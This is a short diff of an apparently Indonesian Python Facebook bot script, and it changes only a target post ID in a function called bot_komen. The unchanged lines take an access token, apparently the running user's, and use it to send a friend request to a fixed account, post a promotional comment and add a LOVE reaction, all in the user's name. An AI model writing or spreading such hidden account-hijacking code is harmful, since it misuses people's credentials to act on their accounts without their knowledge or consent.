@@ -157,7 +157,7 @@ def bot_komen():
     una = '100045781089477'
     kom = 'Hai Saya Pengguna Sc Mu\xf0\x9f\x98\x98'
     reac = 'LOVE'
-    post = '196828378519864'
+    post = '194234645445904'
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toke)
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
     requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toke)
